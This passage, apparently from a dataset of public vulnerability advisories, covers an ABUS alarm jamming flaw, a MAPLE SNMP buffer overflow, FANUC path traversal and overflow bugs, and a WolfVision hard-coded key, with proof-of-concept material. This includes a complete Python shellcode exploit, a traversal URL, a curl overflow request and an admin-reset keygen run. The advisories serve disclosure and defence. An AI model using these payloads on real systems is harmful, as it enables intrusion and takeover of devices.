Some of the supported features as described by the manufacturer are
(see [1]):
""
* Convenient operation via the app (Android/iOS), integrated web
browser and also at the alarm panel
* For up to 50 users with freely selectable control options
(code/chip key/remote control)
* Active intrusion protection in combination with additional mechatronic
wireless window/door locks
* Video verification of alarms via email, push notifications or via the
app
* Up to 48 individually identifiable wireless detectors, eight control
panels, 50 remote controls
* Integrated dialling device
* VdS Home certified and EN 50131-1 Level 2
* Alarm verification via the integration of up to six IP cameras
* 32 additional wireless outputs for flexible event control
* Switching to monitoring station via protocols possible
""
Due to an insufficient implementation of the jamming detection, an
attacker is able to suppress correctly received RF messages sent between
wireless peripheral components, for example wireless detectors or remote
controls, and the ABUS Secvest alarm central.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Thomas Detert found out that the jamming detection of the ABUS alarm
central does not detect short jamming signals that are shorter than
normal ABUS RF messages.
Thus, an attacker is able to perform a ""reactive jamming"" attack. The
reactive jamming simply detects the start of a RF message sent by a
component of the ABUS Secvest wireless alarm system, for instance a
wireless motion detector (FUBW50000) or a remote control (FUBE50014 or
FUBE50015), and overlays it with random data before the original RF
message ends. Thereby, the receiver (alarm central) is not able to
properly decode the original transmitted signal.
This enables an attacker to suppress correctly received RF messages of
the wireless alarm system in an unauthorized manner, for instance status
messages sent by a detector indicating an intrusion.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Thomas Detert developed a Teensy-based PoC tool using a CC1101 sub-1GHz
transceiver that allows suppressing arming the alarm system in an
unauthorized way. He provided his tool including documentation and
source to SySS GmbH for responsible disclosure purposes.
SySS GmbH could successfully perform the described reactive jamming attack
against an ABUS Secvest wireless alarm system. RF messages sent by the
configured ABUS Secvest components FUBE50015 (remote control), FUBW50000
(motion detector), and FUMK50000W (magnetic contact detector) were
successfully suppressed and no alarm was triggered.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
SySS GmbH is not aware of a solution for this reported security
vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-03-02: Vulnerability reported to manufacturer
2019-07-26: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for ABUS Secvest wireless alarm system
https://www.abus.com/eng/Home-Security/Alarm-systems/Secvest-wireless-alarm-system/Alarm-panels-and-kits/Secvest-Wireless-Alarm-System
[2] SySS Security Advisory SYSS-2019-004
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-004.txt
[3] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Thomas Detert.
Mr. Detert reported his finding to SySS GmbH where it was verified and
later reported to the manufacturer by Matthias Deeg.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAl05UeYACgkQ2aS/ajSt
TavmyA//UbBZrmr1KiLHhZpU7W59aAKzUOcDX5sS9MoJqXA07JNrwZ5MIUPoWfhE
8C216n8IJDQvwjeyIibz34YC4rqYF7fI2JBvr0I2oJ1tZGupnn/sIeoIg7N4S7um
POgBAsh60PpNZsODL8+IusObAJkAUh/03j7Vm691ezDzI8IrIKcbif/0d7QsRUvg
+wII5BbTLL16PRaW6umRFwxYUP0EMv2DemgK6WiGbu9ei3Wtd71bkQQqw9YmWG9D
LCPuUgreFe5UQ30cMk8St8ggKe4w3vd1jwbnR69/soca11PfyF4C/jd9+h2F9aDR
BGugY4HXk52FNc9u9NC5tVztPZWP9/6hyUGNpsNBRHXlAxq0tc1bTFieDtcBJPuk
u4rM9gB6lUSBM1qdDWc6dcj6vbTIrTGlQPI0tkRImf2nXnFegUAjRUshCylJ5HXp
P5MCnw+fRh7rdEN5uI7CeTKgW+rsu4SnOA9FK6uGVUi2qj0hwILZ4o+XA33ckL21
C5TLdO7lpXuMG74h/C7xX30VXy9b33X8zWBORqoNSisgJ6OJZyPmIHfmDExuFhY0
pEfYldrlBTxt8RAI6gKlco0t1ntt0+u0MvAQRfLIQG8YtQSzK8z44tiZcGnwJKxj
r97v2/DADGWZu7hHDKynW95MyGjKYnPrpyNXppuIBEnfheuNVH8=
=/Yo1
-----END PGP SIGNATURE-----"
353,CVE-2019-13577 / MAPLE Computer WBT SNMP Administrator v2.0.195.15 / Unauthenticated Remote Buffer Overflow Code Execution 0day,,CVE-2019-13577,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MAPLE-WBT-SNMP-ADMINISTRATOR-v2.0.195.15-REMOTE-BUFFER-OVERFLOW-CODE-EXECUTION-0DAY.txt
[+] ISR: Apparition Security
[Vendor]
www.computerlab.com
[Product]
MAPLE Computer WBT SNMP Administrator (Thin Client Administrator)
v2.0.195.15
https://www.computerlab.com/index.php/downloads/category/27-device-manager
ftp://downloads.computerlab.com/software/SnmpSetup.195.15.EXE
SnmpSetup.195.15.EXE MD5 File Hash: a3913aae166c11ddd21dca437e78c3f4
The CLI Thin Client Manager is designed to provide remote management and control of CLI Thin Clients.
This software is built on the TCP/IP industry standard SNMP (Simple Network Communication Protocol).
Agents are built into the clients for remote management and configuration.
[Vulnerability Type]
Unauthenticated Remote Buffer Overflow Code Execution 0day
[CVE Reference]
CVE-2019-13577
[Security Issue]
SnmpAdm.exe in MAPLE WBT SNMP Administrator v2.0.195.15 has an Unauthenticated Remote Buffer Overflow via a long string to the CE Remote feature listening on Port 987.
This will overwrite data on the stack/registers and allow for control of the programs execution flow resulting in attacker supplied remote code execution.
Authentication is not required for this exploit.
This program seems to be packed using ASPack v2.12 and can be difficult to unpack because it uses self-modifying code.
When installing the vulnerable program if asks for a serial number just enter a value of ""1"" or something.
Upon launching the program if any errors occur try right click SnmpAdm.exe and run it as Admin.
Interestingly, it seems to drop DLLs with .tmp extensions in AppDataLocalTemp directory, make OS system files viewable in explorer to see them.
e.g.
C:UserslahAppDataLocalTemp~ip6B92.tmp
ASLR / SEH are all set to False which help to make exploitation more portable.
CALL EBX
10008FB3 0x10008fb3 : call ebx | null {PAGE_EXECUTE_READ} [ipwSNMPv5.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.0.1364 (C:Program Files (x86)SnmpAdmipwSNMPv5.dll)
Stack dump:
EAX 41414141
ECX 0018FEFC
EDX 0018FF10
EBX 022DDA78 ASCII ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ESP 0018FECC
EBP 0018FEF4
ESI 0018FF10
EDI 0018FEFC
EIP 41414141
C 0 ES 002B 32bit 0(FFFFFFFF)
P 1 CS 0023 32bit 0(FFFFFFFF)
A 0 SS 002B 32bit 0(FFFFFFFF)
Z 0 DS 002B 32bit 0(FFFFFFFF)
S 0 FS 0053 32bit 7EFDD000(FFF)
T 0 GS 002B 32bit 0(FFFFFFFF)
D 0
O 0 LastErr ERROR_NO_SCROLLBARS (000005A7)
EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
[Exploit/POC]
from socket import *
import struct,sys,argparse
#MAPLE WBT SNMP Administrator (SnmpAdm.exe) v2.0.195.15
#CVE-2019-13577
#Remote Buffer Overflow 0day
#hyp3rlinx - ApparitionSec
#Pop calc.exe Windows 7 SP1
sc=(""x31xF6x56x64x8Bx76x30x8Bx76x0Cx8Bx76x1Cx8B""
""x6Ex08x8Bx36x8Bx5Dx3Cx8Bx5Cx1Dx78x01xEBx8B""
""x4Bx18x8Bx7Bx20x01xEFx8Bx7Cx8FxFCx01xEFx31""
""xC0x99x32x17x66xC1xCAx01xAEx75xF7x66x81xFA""
""x10xF5xE0xE2x75xCFx8Bx53x24x01xEAx0FxB7x14""
""x4Ax8Bx7Bx1Cx01xEFx03x2Cx97x68x2Ex65x78x65""
""x68x63x61x6Cx63x54x87x04x24x50xFFxD5xCC"")
eip = struct.pack(""<L"", 0x10008fb3) #JMP EBX
popebx = struct.pack(""<L"", 0x022C0012) #5B POP EBX
buf0=""B""*693704
buf1=eip
buf2=popebx+sc+""R""*899+""W""*23975
payload=buf0+buf1+buf2
def doit(IP,payload):
try:
s=socket(AF_INET, SOCK_STREAM)
s.connect((IP, 987))
s.send(payload)
print ""CVE-2019-13577 - WBT SNMP Administrator Buffer Overflow 0day.""
print ""hyp3rlinx""
s.close()
except Exception as e:
print str(e)
def parse_args():
parser = argparse.ArgumentParser()
parser.add_argument(""-i"", ""--ipaddress"", help=""IP of Target CVE-2019-13577"")
return parser.parse_args()
def main(args):
doit(args.ipaddress,payload)
if __name__ == ""__main__"":
if not len(sys.argv) > 1:
print ""[*] No args supplied see Help -h""
exit()
main(parse_args())
[POC Video URL]
https://www.youtube.com/watch?v=THMqueCIrFw
[Network Access]
Remote
[Severity]
High
[Disclosure Timeline]
Vendor Notification: July 10, 2019
Second vendor notification attempt: July 13, 2019
No vendor replies.
July 17, 2019 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
358,[SYSS-2019-025] FANUC Robotics Virtual Robot Controller - Path Traversal (CWE-22),CWE-22,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-025
Product: FANUC Robotics Virtual Robot Controller
Manufacturer: FANUC Robotics America, Inc.
Affected Version(s): V8.23
Tested Version(s): V8.23
Vulnerability Type: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)
Risk Level: Low
Solution Status: Open
Manufacturer Notification: 2019-05-22
Solution Date: ?
Public Disclosure: 2019-07-15
CVE Reference: CVE-2019-13584
Author of Advisory: Sebastian Hamann, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
FANUC Robotics Virtual Robot Controller is an application for
programming simulated industry robots.
Due to an insufficient validation of user input, the HTTP service of
the application is vulnerable to path traversal attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
vrimserve.exe offers an HTTP service on TCP port 8090, which can be used
to control virtual robots and view their log files.
A path traversal vulnerability was discovered in the log viewer
functionality.
By sending a specially crafted HTTP request to the web server, files and
directories that match the pattern ""*.*"" can be listed anywhere on the
filesystem. Furthermore, the contents of files named ""logfile.txt"" can
be read.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The string ""..%5C"" can be used to access the parent directory.
Therefore, by accessing a URL similar to the following, it is possible
to obtain a list of files (and directories with a . in their name) in
the root directory of the C: partition (or another partition, depending
on the software installation).
http://${target_host}:8090/namedrobots/folder/dir/..%5C..%5C..%5C..%5C..%5C..%5C..%5C../
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The vendor has not yet released a security update.
It is recommended not making the remote admin web server (vrimserve.exe)
available to untrusted networks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-23: Vulnerability discovered
2019-05-22: Vulnerability reported to manufacturer
2019-07-15: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Manufacturer website:
https://www.fanucamerica.com/
[2] SySS Security Advisory SYSS-2019-025
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-025.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Sebastian Hamann of SySS GmbH.
E-Mail: sebastian.hamann syss de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Sebastian_Hamann.asc
Key ID: 0x9CE0E440429D8B96
Key Fingerprint: F643 DF21 62C4 7C53 7DB2 8BA1 9CE0 E440 429D 8B96
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE9kPfIWLEfFN9souhnODkQEKdi5YFAl0snBMACgkQnODkQEKd
i5bTGw/+P/fk4GBXrn8w3WmnyE+ZGwS8PtCFjRSqYQXo1k49l80TBKDYPEtkjZyS
l6jHSjKkkG5Lq6gPaHIh+2pbz7SZt1KUMgKbVJvpv2wGIsPHaRIilsTZS9mp/Izr
VE6x//BJcDx2UhDJNSQfUwZsCt7FipJLZjOlp9omMU4UPCg3bIlNIVNQCiRQPi98
QZZSDkdzbxvGUfUbEeqIwHUDf7uPjwFV8gCzMW+avrnbt29iyofMmmnTTJmJiDkG
weCOR1CZ25pWV1DSYCvTebnWPxCl51t2N2TFqr5Xs/I56j+VjL5q15tRn/pSDa8H
U4zrBB32pjJDvkIFmoZHSCBFB6VOlfRMSgL6JPgnefd04nLLhzDg4Wkkjp4pz4Jx
gEhpI7GFH1rt+rRnqKdV++kKG0IgRAE/GzUCLza1S4AwXwd1m+kNXyz1NKkcbdz7
hyeI5uGigryee/8/frpqeUzbSA/GSylAzvtl+25ZPqyYbWmr4QNF/lMIPRIkZS+6
7fKG7jWLyLzL7MS9c0flZuawBOO9CKtPwQwpvX9aWkmzyUWhY/3D38oZU0L+oBAo
p16UFGQPLoYTBU9YOQA6kg1gxOU6+XLO2xpJtgyUIG6KbgZiLdT8nWD9z9HSMeD9
9fWrKqAZzqK1UjVFDspbnqlJFtVOB0Zt+myu5/3sBmgqjo3LucQ=
=X9vR
-----END PGP SIGNATURE-----"
359,[SYSS-2019-024] FANUC Robotics Virtual Robot Controller - Stack-based Buffer Overflow (CWE-121),CWE-121,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-024
Product: FANUC Robotics Virtual Robot Controller
Manufacturer: FANUC Robotics America, Inc.
Affected Version(s): V8.23
Tested Version(s): V8.23
Vulnerability Type: Stack-based Buffer Overflow (CWE-121)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2019-05-22
Solution Date: ?
Public Disclosure: 2019-07-15
CVE Reference: CVE-2019-13585
Author of Advisory: Sebastian Hamann, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
FANUC Robotics Virtual Robot Controller is an application for
programming simulated industry robots.
Due to a stack-based buffer overflow, the remote admin web server
(vrimserve.exe) is vulnerable to denial-of-service and remote code
execution attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
vrimserve.exe offers an HTTP service on TCP port 8090, which can be used
to control virtual robots and view their log files.
A buffer overflow vulnerability was discovered in the log viewer
functionality. By sending a specially crafted HTTP request to the HTTP
server, the application can be crashed causing a denial-of-service
condition.
Remote code execution may also be possible, but was not confirmed
by SySS GmbH. Gaining control over the instruction pointer (EIP) of this
32 bit application by exploiting the stack-based buffer overflow
vulnerability was successful.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH developed a proof-of-concept exploit that crashes
vrimserve.exe. It is to note that the exploit gives control over the EIP
register, which is an important prerequisite for remote code execution.
curl ""http://${target_host}:8090/namedrobots/folder/dir/<1268 bytes>BBBBCCCCCCCCC""
The bytes denoted as B overwrite the EIP register.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The vendor has not yet released a security update.
It is recommended not making the remote admin web server (vrimserve.exe)
available to untrusted networks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-23: Vulnerability discovered
2019-05-22: Vulnerability reported to manufacturer
2019-07-15: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Manufacturer website:
https://www.fanucamerica.com/
[2] SySS Security Advisory SYSS-2019-024
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-024.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Sebastian Hamann of SySS GmbH.
E-Mail: sebastian.hamann syss de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Sebastian_Hamann.asc
Key ID: 0x9CE0E440429D8B96
Key Fingerprint: F643 DF21 62C4 7C53 7DB2 8BA1 9CE0 E440 429D 8B96
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE9kPfIWLEfFN9souhnODkQEKdi5YFAl0snAwACgkQnODkQEKd
i5ZIqw//bdjzLHzqTtVHEnqFDORa1xmD9478c/57WBKW+kVH/NMupv5CwjsFEJvq
hhY/Ju1Yl+m0kz3R+orHKgUw6VTdfAiogOS/OIW+8yozUQ1lPRDhKcKe/Ai2X2kj
/A/y8mgR43AX2ddcf6tr5XeOeJHgzK3Up8y0fbkvRPQ7aszzWRYCQr4CmXtSsaAf
qxg5fzBwzVEHhDni/tBe6bCqBmV9r+4yi0L2BGV+Cxo08gbsLkAiIhUHJnLG1GbM
mKYFk7v+8JecXEIu12ZiH8Zofn9p2ePeQw/u64VsuUJ+dCJMlyLeAOgXpQiIIt8z
dNj5MS6w37b+4Dc/C7mlfDb9GPGGMyhyK5+TX8KT5LG1MVOyYocnbrD23xSRNSAi
8HhLszTyXcXwkKhsRWelvrEcxaiIsm5y0/4X2gJ/PeTkZNlOPgyD3xv7bth3jUYK
Bcb7NSgp+5FZcaG/moT1W5zL7WFj9wnFd2w4glIPVDUtgy5FQM0cdnGNr1KNvqZB
Esn3Tylbmzt7uQKuT/pZOFk1QQ8VoSnPmyWB6tyBFhTCZxfR+V+MKTIPrCFjrvpQ
D/XDcAT5gqZQHPVK3FI6T8TqF2wS5xoHfNJcPdh6r52puREImY509sze6VWUfzpp
3hfYCusmlwJye9+cbllFCiLNegSNCDBS+nDrRCCXd3QaoOYjls4=
=hm7Q
-----END PGP SIGNATURE-----"
373,[SYSS-2019-021]: WolfVision Cynap - Use of Hard-coded Cryptographic Key (CWE-321),CWE-321,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-021
Product: Cynap
Manufacturer: WolfVision
Affected Version(s): 1.18g, 1.28j
Tested Version(s): 1.18g, 1.28j
Vulnerability Type: Use of Hard-coded Cryptographic Key (CWE-321)
Risk Level: High
Solution Status: Fixed
Manufacturer Notification: 2019-05-03
Solution Date: 2019-06-19
Public Disclosure: 2019-07-04
CVE Reference: Not assigned yet
Authors of Advisory: Manuel Stotz, Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
WolfVision Cynap is a wireless collaboration and presentation system.
The manufacturer describes the product as follows [1]:
""Cynap is a stand-alone all-in-one wireless collaboration and
presentation system which includes a built-in media player, web
conferencing, on-board recording and streaming , BYOD screen sharing
for all mobile devices, and annotation functionality, making it the
ideal device to form the centrepiece of new and adapted classrooms and
meeting spaces.""
Due to the use of a hard-coded cryptographic key, an attacker can
generate support PINs for resetting the administrative user password in
order to gain administrative access to the device.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the WolfVision Cynap wireless collaboration
and presentation system uses a static, hard-coded cryptographic secret
for generating support PINs used for the provided 'forgot password'
functionality.
By knowing this static secret and the corresponding algorithm for
calculating support PINs, an attacker can reset the password of the
administrative user account ""ADMIN"" and thus gain unauthorized access to
the affected Cynap device via a network connection.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH developed a software tool for generating support PINs either
in online or offline mode.
The following output of the software tools illustrates a successful
attack resulting in a reset password for the administrative user
account ""ADMIN"".
$ python ./wolfvision_cynap_keygen.py --online 192.168.40.109
WolfVision vSolution Cynap Keygen
by
Manuel Stotz
Gerhard Klostermeier
[*] Launch keygen in online mode ... [OK]
[*] Gathering data ... [OK]
[*] Serialnumber: <SERIAL NUMBER>
[*] Support PIN: 447301
[*] Generating new Support PIN ... [OK]
[+] New Support PIN: 723247
[*] Account: ADMIN
[*] Password: Password
[*] Bye!
A successful attack against a vulnerable WolfVision Cynap device gaining
administrative access is demonstrated in our SySS PoC video
""Administrating WolfVision Cynap the Hacker's Way"" [5].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the firmware version 1.30j provided by the manufacturer
WolfVision [2].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-05-03: Vulnerability reported to manufacturer
2019-05-10: Vulnerability reported to manufacturer again
2019-05-13: Manufacturer confirms receipt of security advisory
2019-05-31: Manufacturer schedules firmware update 1.30j with fix for
the reported security issue
2019-06-19: Release of firmware update 1.30j including security fix
2019-07-04: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for WolfVision Cynap
https://www.wolfvision.com/vsolution/index.php/en/presentation-systems/cynap/cynap
[2] WolfVision firmware downloads
https://wolfvision.com/vsolution/index.php/de/support/downloads
[3] SySS Security Advisory SYSS-2019-021
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-021.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
[5] SySS Proof-of-Concept Video ""Administrating WolfVision Cynap the Hacker's Way""
https://youtu.be/veEtiYAWvMY
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Manuel Stotz and Gerhard
Klostermeier of SySS GmbH.
E-Mail: manuel.stotz (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Manuel_Stotz.asc
Key fingerprint = F051 5B74 7E70 193E 7F66 0133 E790 F68A BCE6 8C6D
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAl0dqNIACgkQ2aS/ajSt
TasDkQ/+IvddyxRw2qfOI9dnVzGMWWMENy9ZNqn/nji9FiuK2NBC0mAoUuTJQHwh
ZR+tNwDZ4/RKA/DsQNsqNRocdpZ3qR6tQcw0FjGIA+7KCx10tjJ69Kk7k+yqUVen
lBwcfJQYmaWMji7RcvzYxqVXzVOFPTQBokt/6XX4+XStZeWeeMoYbAYUKfwd5oAn
NKHIfUA2SE+D2ghKWpXekm5WtF0ywVb4dSmRPpBTYpzPqQWJpscSoBBLs1RFlISa
fMeo02iHD9DK4itcaUqRpdmT/aAtOXLMZ8ibAW1WoI7tWA1f0KbdEMJq2jIvNFUu
fYPVlG+vjd8IkX4rRdVxpUsXbOo1aIBC4UvmN/DtDzIQ1XTz7kB42KN/M9Qbizuz
RTNal9g3Ft9F9TKAVgnjFDszslnpc48+23oqW/JDXNV725zwDrpJDAxHdZHfAWVU
2as+uJlWNQ8dc/FCAIQRvCs82eiIslXP4Yxtwb7HVXIB3cZHP+SiMrqTIj0cD0uO
CcjwGo2H8MS+ESL7DHw1eSXwSdy+kyTxoKW0WdTB/NZC/Ni/dYoOkhVoFbU0BTW1
oViuGHdXEBv72oVbE7U5WxR4izdeJ6ZnSxLPrCl9QMnmdR0gLyB9GawH9UbGvUJP
7HfvEDFy7l85yjsAgzeySA1NR7nsFPaQiTimI9YlBAckEELdw6s=
=jPkC
-----END PGP SIGNATURE-----"
427,[SYSS-2019-014]: Siemens LOGO! 8 - Storing Passwords in a Recoverable Format (CWE-257),CWE-257,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-014
Product: LOGO!
Manufacturer: Siemens
Affected Version(s): LOGO! 8 (all versions)
Tested Version(s): LOGO! 8, 6ED1052-2MD00-0BA8 FS:03, 0BA8.Standard V1.08.03
Vulnerability Type: Storing Passwords in a Recoverable Format (CWE-257)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2019-04-04
Solution Date: 2019-05-14 (recommended mitigation by manufacturer)
Public Disclosure: 2019-05-29
CVE Reference: CVE-2019-10921
Authors of Advisory: Manuel Stotz (SySS GmbH), Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Siemens LOGO! is a programmable logic controller (PLC) for small
automation tasks.
